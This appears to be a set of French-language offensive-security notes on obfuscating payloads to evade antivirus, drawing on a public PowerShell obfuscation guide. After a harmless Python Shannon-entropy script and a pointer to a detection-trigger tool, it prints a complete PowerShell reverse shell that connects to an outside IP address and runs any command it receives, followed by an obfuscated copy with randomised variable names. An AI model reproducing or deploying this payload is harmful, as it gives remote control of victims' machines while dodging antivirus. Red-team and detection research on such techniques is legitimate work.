Source : https://github.com/t3l3machus/PowerShell-Obfuscation-Bible/blob/main/README.md

L'**obfuscation** est le fait de **rendre** un payload **plus obscure** afin d'**évader** les protections **Antivirus**.

## __Entropie__

L'**entropie** est une notion mathématique qui vise à **mesurer** à quel point un **payload est aléatoire**, si une chaine est composé exclusivement d'un seul caractère son entropie sera 0, **plus il y a de caractère différent plus l'entropie va augmenter**, le calcul prend aussi en compte la **fréquence d'apparition** de ces caractères.

Pour la calculer on a implémenté la **formule de Claude E. Shannon** en python :

```python
#!/bin/python3
# Usage: python3 entropy.py <file>

import math, sys

def entropy(string):
    "Calculates the Shannon entropy of a UTF-8 encoded string"

    # decode the string as UTF-8
    unicode_string = string.decode('utf-8')

    # get probability of chars in string
    prob = [ float(unicode_string.count(c)) / len(unicode_string) for c in dict.fromkeys(list(unicode_string)) ]

    # calculate the entropy
    entropy = - sum([ p * math.log(p) / math.log(2.0) for p in prob ])

    return entropy


f = open(sys.argv[1], 'rb')
content = f.read()
f.close()

print(entropy(content))
```

![[Entropy1.png]]


## __Identify Detection Triggers__

Avant d'effectuer une tentative d'obscusissement du code, il faut **savoir ce qui déclanche l'alerte**, pour se faire, on peut utiliser **[AMSITrigger](https://github.com/RythmStick/AMSITrigger)**.

On peut également le faire à la main en regardant les erreurs.


## __Rename Objects__



```powershell
PS > "$TCPClient = New-Object Net.Sockets.UDPClient('20.235.121.153', 8181);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
```

```powershell
PS > "$kpykyyhakxbgfe = New-Object Net.Sockets.UDPClient('20.235.121.153', 8181);$naa1uyzc6a9a526j = $kpykyyhakxbgfe.GetStream();$gyvfl8nd2wmvr0a = New-Object Net.Security.SslStream($naa1uyzc6a9a526j,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$gyvfl8nd2wmvr0a.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$gyvfl8nd2wmvr0a.IsEncrypted -or !$gyvfl8nd2wmvr0a.IsSigned) {$gyvfl8nd2wmvr0a.Close();exit}$z0coq2szpfkxt4 = New-Object IO.StreamWriter($gyvfl8nd2wmvr0a);function WriteToStream ($0yjea14ea1) {[byte[]]$script:Buffer = 0..$kpykyyhakxbgfe.ReceiveBufferSize | % {0};$z0coq2szpfkxt4.Write($0yjea14ea1 + 'SHELL> ');$z0coq2szpfkxt4.Flush()};WriteToStream '';while(($8kwjkmbth = $gyvfl8nd2wmvr0a.Read($2kjs0qho00t, 0, $2kjs0qho00t.Length)) -gt 0) {$glxfjr1s8n02k1zp = ([text.encoding]::UTF8).GetString($2kjs0qho00t, 0, $8kwjkmbth - 1);$15x0e1yh0 = try {Invoke-Expression $glxfjr1s8n02k1zp 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($15x0e1yh0)}$z0coq2szpfkxt4.Close()"
```